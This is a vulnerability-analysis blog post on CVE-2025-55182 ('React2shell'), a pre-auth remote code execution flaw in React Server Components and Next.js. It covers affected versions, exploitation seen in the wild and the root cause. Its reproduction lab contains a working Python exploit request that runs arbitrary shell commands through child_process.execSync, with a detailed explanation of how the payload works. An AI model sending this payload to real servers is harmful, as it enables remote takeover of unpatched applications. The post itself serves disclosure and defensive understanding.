---
layout: layouts/base.njk
title: "CVE-202-55182 - React2shell critical pre-auth RCE in React Server Components"
tags: post
---

# CVE-2025-55182 - "React2shell" critical pre-auth RCE in React Server Components

On 3 December, 2025, a critical remote code execution vulnerability was disclosed in React Server Components, tracked as [CVE-2025-55182](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-55182). This flaw allows unauthenticated attackers to execute arbitrary code on servers running [React Server Components](https://react.dev/blog/2025/11/15/react-server-components) versions 19.0.0, 19.1.0, 19.1.1, and 19.2.0. As React Server Components are widely used in modern web applications built with React (most notably Next.js), and because exploitation is as simple as sending a specially crafted request to a vulnerable server, this vulnerability has been assigned the maximal CVSS base score of 10.0 (Critical). Public exploits have been available since December 5, 2025, two days after disclosure.

Any web application depending on the following packages is vulnerable unless updated:
* [react-server-dom-parcel](https://www.npmjs.com/package/react-server-dom-parcel)
* [react-server-dom-turbopack](https://www.npmjs.com/package/react-server-dom-turbopack)
* [react-server-dom-webpack](https://www.npmjs.com/package/react-server-dom-webpack)

Multiple WAF vendors (including [Cloudflare](https://blog.cloudflare.com/react2shell-rsc-vulnerabilities-exploitation-threat-brief/), [AWS](https://aws.amazon.com/blogs/security/china-nexus-cyber-threat-groups-rapidly-exploit-react2shell-vulnerability-cve-2025-55182/), [Vercel](https://vercel.com/blog/our-million-dollar-hacker-challenge-for-react2shell), ...) have reported massive exploitation of this vulnerability in the wild, emphasizing the urgency of patching affected systems. China state-nexus threat groups (Earth Lamia, Jackpot Panda) [have been observed](https://aws.amazon.com/blogs/security/china-nexus-cyber-threat-groups-rapidly-exploit-react2shell-vulnerability-cve-2025-55182/) automatically scanning and exploiting this vulnerability, among others.

## Affected Versions

* react-server-dom-parcel versions 19.0.0, 19.1.0, 19.1.1, and 19.2.0
* react-server-dom-turbopack versions 19.0.0, 19.1.0, 19.1.1, and 19.2.0
* react-server-dom-webpack versions 19.0.0, 19.1.0, 19.1.1, and 19.2.0


# What is React Server Components ?

React Server Components (RSC) is part of the React framework that allows developers to build components that are rendered on the server side (SSR). This approach is meant to improve performance and user experience by reducing the amount of JavaScript sent to and interpreted by the browser. RSC is a direct dependency in many modern web applications built with React, and is used in several popular frameworks like Next.js.

While not a hard dependency in Next.js, [Next.js App Router](https://nextjs.org/docs/app/building-your-application/routing) uses React Server Components by default, making applications built with Next.js potentially vulnerable if they use affected versions of the RSC packages.

# The vulnerability

The vulnerability in CVE-2025-55182 stems from improper handling of untrusted input in the serialization and deserialization processes of React Server Components. Exploiting it is as simple as sending a specially crafted request to a vulnerable server, which can lead to arbitrary code execution with the same privileges as the server process.

By hijacking the promise resolution process during deserialization, an attacker can execute arbitrary JavaScript code on the server. This is typically achieved by manipulating the `then` property of a promise object to point to a malicious function that executes system commands. Because React's Flight protocol doesn't adequately validate that accessors never point to JS internal machinery (like `constructor` or `__proto__`), an attacker can leverage this to change the prototype chain and gain access to powerful constructors like `Function`, enabling the execution of arbitrary code.


# Reproduction lab

1. **Vulnerable React server**

The easiest way to reproduce the vulnerability is to set up a basic Next.js React 19.2.0 server, using [create-next-app](https://nextjs.org/docs/app/api-reference/cli/create-next-app). A typical `package.json` file would look like this:

```json
{
  "name": "cve-2025-55182-react2shell",
  "version": "1.0.0",
  "dependencies": {
    "next": "16.0.6",
    "react": "19.2.0",
    "react-dom": "19.2.0"
  }
}
```
Then build and run the server:

```bash
next build
next start
```

As React Server Components are used by default in Next.js App Router, no additional configuration is needed to enable RSC. The server will be listening on port 3000 by default.


2. **Crafted Client RSC Request**
Once the vulnerable server is running, you can send a crafted request to exploit the vulnerability:

{% raw %}
```python
requests.post(
    URL,
    files={
        "0": (
            None,
            json.dumps(
                {
                    "status": "resolved_model",
                    "reason": 0,
                    "_response": {
                        "_prefix": f"""var res = process.mainModule.require('child_process').execSync('{COMMAND}'); throw Object.assign(new Error(), {{digest:`${{res}}`}});""",
                        "_formData": {
                            "get": "$1:then:constructor",
                        },
                    },
                    "then": "$1:then",
                    "value": '{"then":"$B"}',
                }
            ),
        ),
        "1": (None, '"$@0"'),
    },
    headers={"Next-Action": "x"},
)
```
{% endraw %}

As explained in details in [Guillermo Rauch post on X](https://x.com/rauchg/status/1997362942929440937?s=46&t=JS55_O2JZmKWQpZHLAse_A) and ([Wiz.io's blog post](https://www.wiz.io/blog/nextjs-cve-2025-55182-react2shell-deep-dive), this Python script sends a POST request to the vulnerable server with a crafted payload that hijacks the promise resolution to execute the specified command on the server. The payload is masquerading as a legitimate RSC Flight protocol continuation request. In Next.js, adding the `Next-Action` header forces deserialization to occur **no matter which endpoint we hit**, so no need to discover an exposed RSC endpoint. We thus submit a multipart/form-data request with where '0' and '1' parts are interpreted as Flight protocol chunks by the React Server Components deserializer. `"$@0"` in part "1" makes chunk "0" to be handled as a Promise. The special `"status": "ùöõùöéùöúùöòùöïùöüùöéùöç_ùöñùöòùöçùöéùöï"` makes React interpret our payload as "resume with a nested model", whose `value` is ready to be used. Then, exploiting  insufficient checks that our resolver doesn't access JS low-level attributes, we leverage our fake Promise `.then` method's `Function` constructor to gain arbitrary execution, by hijacking `FormData.get` accessor to make it execute our `_prefix` hook as server-side JS code.

Note that in a vanilla React setup, the deserialization logic is only invoked if the developer has explicitly exposed a RSC POST endpoint that accepts RSC payloads. In Next.js, this is handled automatically when using the App Router.


See https://github.com/jfellus/vulnintelblog/tree/master/labs/CVE-2025-55182-React2shell for a full reproduction lab.

# References

* https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components
* https://x.com/rauchg/status/1997362942929440937?s=46&t=JS55_O2JZmKWQpZHLAse_A
* https://github.com/vercel-labs/fix-react2shell-next?tab=readme-ov-file
* https://www.wiz.io/blog/nextjs-cve-2025-55182-react2shell-deep-dive
* https://nvd.nist.gov/vuln/detail/CVE-2025-55182
* https://www.cert.ssi.gouv.fr/alerte/CERTFR-2025-ALE-014/